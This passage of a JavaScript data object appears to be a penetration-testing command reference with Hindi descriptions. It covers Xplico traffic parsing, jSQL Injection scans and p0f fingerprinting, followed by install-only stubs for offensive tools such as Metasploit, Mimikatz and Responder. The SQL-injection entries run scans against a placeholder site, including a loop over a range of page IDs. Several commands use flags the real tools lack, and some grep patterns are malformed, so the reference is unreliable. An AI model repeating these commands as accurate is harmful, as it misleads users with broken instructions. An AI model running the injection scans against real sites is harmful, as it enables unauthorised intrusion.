      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-p <port>", "पोर्ट"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-s", "साइलेंट"],
      ["-d", "डीबग"],
      ["-t <type>", "प्रोटोकॉल फ़िल्टर"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "xplico -i eth0 -o /output", desc: "Xplico कैप्चर शुरू" },
      { cmd: "xplico -r capture.pcap -o /output", desc: "PCAP फ़ाइल पार्स" },
      { cmd: "xplico -i eth0 -o /output -p 80", desc: "पोर्ट 80 ही पार्स" },
      { cmd: "xplico -i eth0 -o /output -v", desc: "वर्बोज़ मोड" },
      { cmd: "xplico -i eth0 -o /output -t http", desc: "HTTP ही पार्स" },
      { cmd: "xplico -r network.pcap -o /output -v", desc: "वर्बोज़ PCAP पार्स" },
      { cmd: "xplico -i eth0 -o /output -q", desc: "शांत मोड" },
      { cmd: "xplico -i wlan0 -o /output", desc: "वायरलेस कैप्चर" },
      { cmd: "xplico -r traffic.pcap -o /output -t smtp", desc: "SMTP ही निकालें" },
      { cmd: "xplico -i eth0 -o /output -d", desc: "डीबग मोड" }
    ],
    advanced: [
      { cmd: "xplico -r capture.pcap -o /output -v -t http,ftp,smtp 2>&1 | tee xplico.log", desc: "चुनिंदा प्रोटोकॉल पार्स लॉग" },
      { cmd: "xplico -i eth0 -o /output -v 2>&1 | grep -i 'email\\;file\\;image'", desc: "निकाली गई फ़ाइलें फ़िल्टर" },
      { cmd: "tcpdump -i eth0 -w capture.pcap & xplico -r capture.pcap -o /output -t http", desc: "कैप्चर और HTTP पार्स" },
      { cmd: "for pcap in *.pcap; do xplico -r $pcap -o /output_$(basename $pcap .pcap); done", desc: "एकाधिक PCAP पार्स" },
      { cmd: "xplico -r capture.pcap -o /output -v 2>&1 | tail -25", desc: "अंतिम 25 पार्स आँकड़े" }
    ],
    script: "echo 'Xplico PDU पार्सर...'\nmkdir -p /tmp/xplico_output\nxplico -r /tmp/capture.pcap -o /tmp/xplico_output -v -t http,ftp,smtp 2>&1 | tee /tmp/xplico.log\necho 'आउटपुट: /tmp/xplico_output'"
  },
  jSQLInjection: {
    install: { pkg: "j-sql-injection" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-d <data>", "POST डेटा"],
      ["-c <cookie>", "कुकी"],
      ["-x <proxy>", "प्रॉक्सी"],
      ["-p <param>", "पैरामीटर"],
      ["-t <type>", "डीबी प्रकार"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1", desc: "SQL इंजेक्शन स्कैन" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/login.php -d 'user=admin&pass=123'", desc: "POST SQLi स्कैन" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -c 'PHPSESSID=abc'", desc: "कुकी SQLi" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -x http://127.0.0.1:8080", desc: "प्रॉक्सी SQLi" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -t mysql", desc: "MySQL SQLi" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -o report.txt", desc: "रिपोर्ट सेव करें" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -v", desc: "वर्बोज़ SQLi" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -s", desc: "साइलेंट SQLi" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -p id", desc: "पैरामीटर फ़ोकस SQLi" },
      { cmd: "java -jar jsql-injection.jar -u https://example.com/page?id=1 -t mssql", desc: "HTTPS MSSQL SQLi" }
    ],
    advanced: [
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -v -x http://127.0.0.1:8080 2>&1 | tee jsql.log", desc: "प्रॉक्सी SQLi लॉग" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -v 2>&1 | grep -i 'injectable\\;vuln'", desc: "इंजेक्टेबल फ़िल्टर" },
      { cmd: "for id in $(seq 1 30); do java -jar jsql-injection.jar -u \"http://example.com/page.php?id=$id\" -s; done", desc: "ID रेंज SQLi" },
      { cmd: "java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -c 'admin=1' -x http://127.0.0.1:8080 -v", desc: "प्रमाणीकृत प्रॉक्सी SQLi" },
      { cmd: "sqlmap -u http://example.com/page.php?id=1 --batch && java -jar jsql-injection.jar -u http://example.com/page.php?id=1 -v", desc: "SQLmap और jSQL संयोजन" }
    ],
    script: "echo 'jSQL इंजेक्शन स्कैन...'\njava -jar /usr/share/jsql-injection/jsql-injection.jar -u $1 -v -o /tmp/jsql_report.txt 2>/dev/null | tee /tmp/jsql.log\ngrep 'vuln' /tmp/jsql.log\n"
  },

  P0f: {
    install: { pkg: "p0f" },
    options: [
      ["-i <iface>", "इंटरफ़ेस से पैकेट कैप्चर करें"],
      ["-r <file>", "PCAP फ़ाइल से पढ़ें"],
      ["-l", "लिसन मोड (निष्क्रिय)"],
      ["-s", "सर्वर मोड"],
      ["-A", "सभी पहचान सक्षम करें"],
      ["-M", "MTU पहचान सक्षम करें"],
      ["-D", "दूषित पैकेट लॉग करें"],
      ["-o <file>", "आउटपुट फ़ाइल में सेव करें"],
    ],
    basic: [
      { cmd: "p0f -i eth0", desc: "इंटरफ़ेस पर निष्क्रिय OS फिंगरप्रिंटिंग" },
      { cmd: "p0f -r capture.pcap", desc: "PCAP फ़ाइल से विश्लेषण" },
      { cmd: "p0f -i eth0 -o results.log", desc: "परिणाम फ़ाइल में सेव करना" },
      { cmd: "p0f -i eth0 -A", desc: "सभी पहचान मोड सक्षम करना" },
      { cmd: "p0f -i eth0 -s", desc: "सर्वर मोड में चलाना" },
      { cmd: "p0f -r capture.pcap -o p0f_output.txt", desc: "PCAP से आउटपुट सेव करना" },
      { cmd: "p0f -i eth0 -M", desc: "MTU पहचान के साथ" },
      { cmd: "p0f -i eth0 -D", desc: "दूषित पैकेट लॉगिंग के साथ" },
      { cmd: "p0f -i eth0 -l", desc: "निष्क्रिय लिसन मोड" },
      { cmd: "p0f --help", desc: "सहायता मेनू देखना" },
    ],
    advanced: [
      { cmd: "p0f -i eth0 -A -o p0f.log 2>&1 | tee full_output.txt", desc: "पूर्ण निष्क्रिय स्कैन रीयल-टाइम मॉनिटरिंग" },
      { cmd: "p0f -r capture.pcap -o parsed.txt && grep -E OS Fingerprint parsed.txt | sort -u", desc: "PCAP से OS फिंगरप्रिंट फ़िल्टर करना" },
      { cmd: "for iface in eth0 wlan0; do p0f -i $iface -o ${iface}_p0f.log -A; done", desc: "एकाधिक इंटरफ़ेस पर निगरानी" },
    ],
    script: [
      'INTERFACE="eth0"',
      'OUTPUT_DIR="p0f_logs"',
      'mkdir -p $OUTPUT_DIR',
      'p0f -i $INTERFACE -A -o "$OUTPUT_DIR/p0f_$(date +%Y%m%d).log"',
      'echo "निगरानी शुरू। लॉग्स: $OUTPUT_DIR/"'
    ].join('\n')
  },

  AircrackNg: {
    install: { pkg: "aircrack-ng" },
  },
  Airgeddon: {
    install: { pkg: "airgeddon" },
  },
  Amass: {
    install: { pkg: "amass" },
  },
  Apktool: {
    install: { pkg: "apktool" },
  },
  ArpScan: {
    install: { pkg: "arp-scan" },
  },
  BeefXss: {
    install: { pkg: "beef-xss" },
  },
  Bettercap: {
    install: { pkg: "bettercap" },
  },
  Binwalk: {
    install: { pkg: "binwalk" },
  },
  Bloodhound: {
    install: { pkg: "bloodhound" },
  },
  Burpsuite: {
    install: { pkg: "burpsuite" },
  },
  CeWL: {
    install: { pkg: "cewl" },
  },
  Chisel: {
    install: { pkg: "chisel" },
  },
  Commix: {
    install: { pkg: "commix" },
  },
  Crackmapexec: {
    install: { pkg: "crackmapexec" },
  },
  Crunch: {
    install: { pkg: "crunch" },
  },
  Dirb: {
    install: { pkg: "dirb" },
  },
  Dnscat2: {
    install: { pkg: "dnscat2" },
  },
  Dnsenum: {
    install: { pkg: "dnsenum" },
  },
  Dnsrecon: {
    install: { pkg: "dnsrecon" },
  },
  Drozer: {
    install: { pkg: "drozer" },
  },
  Eaphammer: {
    install: { pkg: "eaphammer" },
  },
  Empire: {
    install: { pkg: "powershell-empire" },
  },
  Enum4linux: {
    install: { pkg: "enum4linux" },
  },
  EvilWinrm: {
    install: { pkg: "evil-winrm" },
  },
  Ffuf: {
    install: { pkg: "ffuf" },
  },
  Frida: {
    install: { pkg: "frida" },
  },
  Gobuster: {
    install: { pkg: "gobuster" },
  },
  Hashcat: {
    install: { pkg: "hashcat" },
  },
  Hcxdumptool: {
    install: { pkg: "hcxdumptool" },
  },
  HostapdMana: {
    install: { pkg: "hostapd-mana" },
  },
  Hping3: {
    install: { pkg: "hping3" },
  },
  Hydra: {
    install: { pkg: "hydra" },
  },
  Impacket: {
    install: { pkg: "impacket-scripts" },
  },
  John: {
    install: { pkg: "john" },
  },
  Katana: {
    install: { pkg: "katana" },
  },
  Kismet: {
    install: { pkg: "kismet" },
  },
  Lynis: {
    install: { pkg: "lynis" },
  },
  Macchanger: {
    install: { pkg: "macchanger" },
  },
  Maltego: {
    install: { pkg: "maltego" },
  },
  Masscan: {
    install: { pkg: "masscan" },
  },
  Medusa: {
    install: { pkg: "medusa" },
  },
  Metasploit: {
    install: { pkg: "metasploit-framework" },
  },
  Mimikatz: {
    install: { pkg: "mimikatz" },
  },
  Mitmproxy: {
    install: { pkg: "mitmproxy" },
  },
  Msfvenom: {
    install: { pkg: "msfvenom" },
  },
  Naabu: {
    install: { pkg: "naabu" },
  },
  Netcat: {
    install: { pkg: "netcat-traditional" },
  },
  Netdiscover: {
    install: { pkg: "netdiscover" },
  },
  Nikto: {
    install: { pkg: "nikto" },
  },
  Nmap: {
    install: { pkg: "nmap" },
  },
  Nuclei: {
    install: { pkg: "nuclei" },
  },
  Objection: {
    install: { pkg: "objection" },
  },
  Pixiewps: {
    install: { pkg: "pixiewps" },
  },
  Proxychains: {
    install: { pkg: "proxychains4" },
  },
  Radare2: {
    install: { pkg: "radare2" },
  },
  Reaver: {
    install: { pkg: "reaver" },
  },
  ReconNg: {
    install: { pkg: "recon-ng" },
  },
  Responder: {
    install: { pkg: "responder" },
  },
  Searchsploit: {
    install: { pkg: "searchsploit" },
  },
  Setoolkit: {
    install: { pkg: "setoolkit" },
  },
  Sherlock: {
    install: { pkg: "sherlock" },
  },
  Socat: {
    install: { pkg: "socat" },
  },
  Sqlmap: {
    install: { pkg: "sqlmap" },
  },
  Sqlninja: {
    install: { pkg: "sqlninja" },
  },
  Sslstrip: {
    install: { pkg: "sslstrip" },
  },
  Subfinder: {
    install: { pkg: "subfinder" },
  },
  Tcpdump: {
    install: { pkg: "tcpdump" },
  },
  Theharvester: {
    install: { pkg: "theharvester" },
  },
  Trivy: {
    install: { pkg: "trivy" },
  },
  Volatility: {
    install: { pkg: "volatility" },
  },
  Wafw00f: {
    install: { pkg: "wafw00f" },
  },
  Weevely: {
    install: { pkg: "weevely" },
  },
  Whois: {
    install: { pkg: "whois" },
  },
  Wifite: {
    install: { pkg: "wifite" },
  },
  Wireshark: {
    install: { pkg: "wireshark" },
  },
  Wpscan: {
    install: { pkg: "wpscan" },
  },
  Yersinia: {
    install: { pkg: "yersinia" },
  },
};